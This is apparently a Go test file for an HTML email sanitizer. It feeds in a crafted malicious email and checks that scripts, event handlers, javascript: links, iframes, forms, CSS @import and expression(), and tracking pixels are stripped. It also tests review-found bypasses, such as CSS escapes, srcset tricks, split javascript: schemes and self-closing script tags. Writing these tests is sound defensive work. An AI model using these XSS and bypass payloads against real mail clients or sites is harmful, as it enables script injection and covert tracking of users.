package htmlsan

import (
	"strings"
	"testing"
)

// 固定样本：一封「恶意 + 追踪」的 HTML 邮件里所有该被剥掉的东西。
const malicious = `<!DOCTYPE html><html><head>
<meta http-equiv="refresh" content="0;url=https://evil.example/">
<base href="https://evil.example/">
<link rel="stylesheet" href="https://evil.example/a.css">
<link rel="preconnect" href="https://fonts.googleapis.com">
<title>x</title>
<style>body{background:url("https://track.example/bg.png")} .a{color:red} @import url(https://evil.example/x.css); p{behavior:url(x.htc)}</style>
<script>alert(1)</script>
</head><body onload="alert(2)">
<p style="background-image:url('https://track.example/p.gif');color:blue" onclick="x()">hello <b>world</b></p>
<img src="https://track.example/pixel.gif" width="1" height="1" alt="">
<img src="cid:logo@x" width="80">
<img src="data:image/png;base64,iVBORw0KGgo=" alt="inline">
<img srcset="https://track.example/a.png 1x, https://track.example/b.png 2x" src="https://track.example/a.png">
<a href="javascript:alert(3)">js</a>
<a href="https://example.com/page">link</a>
<a href="mailto:a@b.c">mail</a>
<iframe src="https://evil.example/f"></iframe>
<object data="https://evil.example/o.swf"><param name="x"></object>
<table background="https://track.example/t.png"><tr><td bgcolor="#fff">cell</td></tr></table>
<!--[if mso]><p>outlook only</p><![endif]-->
<form action="https://evil.example/steal"><input name="pw"></form>
<svg onload="alert(4)"><script>alert(5)</script></svg>
</body></html>`

func TestSanitizeBlocksEverything(t *testing.T) {
	res := Sanitize(malicious, false)
	h := res.HTML
	for _, bad := range []string{
		"<script", "alert(", "onload", "onclick", "<iframe", "<object", "<form", "<input", "<svg", "<meta", "<base",
		"<link", "javascript:", "@import", "behavior", "track.example", "evil.example", "srcset", "outlook only",
	} {
		if strings.Contains(strings.ToLower(h), bad) {
			t.Errorf("output still contains %q:\n%s", bad, h)
		}
	}
	for _, good := range []string{
		"hello <b>world</b>", `src="cid:logo@x"`, `data:image/png;base64`, `href="https://example.com/page"`,
		`href="mailto:a@b.c"`, `.a{color:red}`, "color:blue", `bgcolor="#fff"`, placeholderImage,
	} {
		if !strings.Contains(h, good) {
			t.Errorf("output lost %q:\n%s", good, h)
		}
	}
	// 远程引用计数：style 块 bg + @import、p 的 style、pixel、srcset、srcset 旁的 src、table background = 7
	if res.RemoteCount != 7 {
		t.Errorf("RemoteCount = %d, want 7\n%s", res.RemoteCount, h)
	}
	// 外链带 target/rel
	if !strings.Contains(h, `target="_blank"`) || !strings.Contains(h, "noreferrer") {
		t.Errorf("links should open in new tab with noreferrer:\n%s", h)
	}
}

func TestSanitizeAllowRemoteKeepsButCounts(t *testing.T) {
	res := Sanitize(malicious, true)
	h := res.HTML
	if res.RemoteCount != 7 {
		t.Errorf("RemoteCount = %d, want 7", res.RemoteCount)
	}
	for _, kept := range []string{
		`src="https://track.example/pixel.gif"`, `background:url("https://track.example/bg.png")`,
		`background-image:url(&#39;https://track.example/p.gif&#39;)`, `srcset=`,
	} {
		if !strings.Contains(h, kept) {
			t.Errorf("allowRemote should keep %q:\n%s", kept, h)
		}
	}
	// 放行远程不等于放行脚本
	for _, bad := range []string{"<script", "alert(", "onload", "javascript:", "@import", "behavior"} {
		if strings.Contains(strings.ToLower(h), bad) {
			t.Errorf("allowRemote must still strip %q", bad)
		}
	}
}

// TestSanitizeReviewFindings 固定安全审查找到的绕过与解析缺陷。
func TestSanitizeReviewFindings(t *testing.T) {
	// 1. 空 style 块不能吞掉正文
	r := Sanitize(`<style type="text/css"></style><p>after</p>`, false)
	if !strings.Contains(r.HTML, "<p>after</p>") {
		t.Errorf("empty style swallowed body: %q", r.HTML)
	}
	// 自闭合 <style/> 之后全是原始文本（浏览器同样如此），但绝不能因此丢出错误或把文本当标签
	r = Sanitize(`<style/><p>after</p>`, false)
	if !strings.HasPrefix(r.HTML, "<style>") || strings.Contains(strings.TrimSuffix(strings.TrimSpace(r.HTML), "</style>")+"|", "</style>|") {
		t.Errorf("self-closing style must keep following raw text inside the style block: %q", r.HTML)
	}
	// 2. CSS 转义与 image-set
	r = Sanitize(`<p style="background:\75rl(https://t.example/a.png)">x</p><style>b{background:\75 rl('https://t.example/b.png')} c{background:image-set('https://t.example/c.png' 1x)}</style>`, false)
	if strings.Contains(r.HTML, "t.example") || r.RemoteCount != 3 {
		t.Errorf("css escape / image-set bypass: count=%d %q", r.RemoteCount, r.HTML)
	}
	// 3. srcset 非首候选的协议相对地址
	r = Sanitize(`<img srcset="a.png 1x, //track.example/p.png 2x" src="a.png">`, false)
	if strings.Contains(r.HTML, "track.example") || r.RemoteCount != 1 {
		t.Errorf("srcset bypass: count=%d %q", r.RemoteCount, r.HTML)
	}
	// 4. URL 里的控制字符与反斜杠
	r = Sanitize("<img src=\"ht\ntps://t.example/x.png\"><img src=\"https:/\\t.example/d.png\">", false)
	if strings.Contains(r.HTML, "t.example") || r.RemoteCount != 2 {
		t.Errorf("url normalization: count=%d %q", r.RemoteCount, r.HTML)
	}
	// 6. 危险声明只删自己，不越过 }（不带分号的 @import 按 CSS 语法本就会连带吞掉紧随的块，不苛求）
	r = Sanitize(`<style>a{color:red;background:expression(1)}b{color:blue} @import url(x); c{color:green}</style>`, false)
	if !strings.Contains(r.HTML, "b{color:blue}") || !strings.Contains(r.HTML, "c{color:green}") || strings.Contains(r.HTML, "expression") || strings.Contains(r.HTML, "@import") {
		t.Errorf("over-deletion: %q", r.HTML)
	}
	// 10. 遗留原始文本元素整块丢弃
	r = Sanitize(`<p>a</p><plaintext><img src="https://t.example/o.png">`, false)
	if strings.Contains(r.HTML, "&amp;lt;") || strings.Contains(r.HTML, "t.example") {
		t.Errorf("plaintext: %q", r.HTML)
	}
	// 11. 自闭合 script 后的源码不当正文显示
	r = Sanitize(`<script/>alert(1)</script><p>x</p>`, false)
	if strings.Contains(r.HTML, "alert(1)") || !strings.Contains(r.HTML, "<p>x</p>") {
		t.Errorf("self-closing script: %q", r.HTML)
	}
	// 13. 邮件自带 rel/target 不参与拼装
	r = Sanitize(`<a href="https://example.com/" rel="opener" target="_self">l</a>`, false)
	if strings.Contains(r.HTML, "opener\"") && !strings.Contains(r.HTML, "noopener") || strings.Contains(r.HTML, "_self") {
		t.Errorf("rel/target: %q", r.HTML)
	}
	if strings.Contains(r.HTML, `rel="opener`) {
		t.Errorf("mail-provided rel leaked: %q", r.HTML)
	}
}

func TestSanitizeEdgeCases(t *testing.T) {
	if r := Sanitize("", false); r.HTML != "" || r.RemoteCount != 0 {
		t.Errorf("empty: %+v", r)
	}
	// 纯文本片段原样（转义）
	if r := Sanitize("a < b & c", false); r.HTML != "a &lt; b &amp; c" {
		t.Errorf("text: %q", r.HTML)
	}
	// 拆开写的 javascript: 与协议相对地址
	r := Sanitize(`<a href="java&#9;script:alert(1)">x</a><img src="//track.example/p.gif">`, false)
	if strings.Contains(strings.ToLower(r.HTML), "script:") || strings.Contains(r.HTML, "track.example") || r.RemoteCount != 1 {
		t.Errorf("obfuscated: %+v", r)
	}
	// 嵌套的丢弃元素：内层同名不会提前结束丢弃（noscript 是原始文本元素，用 object 测嵌套）
	r = Sanitize(`<div>a<object>x<object>y</object>z</object>b</div>`, false)
	if r.HTML != "<div>ab</div>" {
		t.Errorf("nested drop: %q", r.HTML)
	}
	// noscript 整块丢弃
	r = Sanitize(`<p>a<noscript><img src="https://t.example/p.gif"></noscript>b</p>`, false)
	if r.HTML != "<p>ab</p>" || r.RemoteCount != 0 {
		t.Errorf("noscript: %+v", r)
	}
	// data:text/html 不算图片
	r = Sanitize(`<img src="data:text/html;base64,PHNjcmlwdD4=">`, false)
	if strings.Contains(r.HTML, "data:text/html") {
		t.Errorf("data:text/html must be dropped: %q", r.HTML)
	}
	// 未知标签剥壳留文本；表格与样式保留
	r = Sanitize(`<custom-x>t</custom-x><table style="width:100%"><tr><td align="center">c</td></tr></table>`, false)
	if strings.Contains(r.HTML, "custom-x") || !strings.Contains(r.HTML, `<td align="center">c</td>`) || !strings.Contains(r.HTML, `style="width:100%"`) {
		t.Errorf("markup: %q", r.HTML)
	}
}
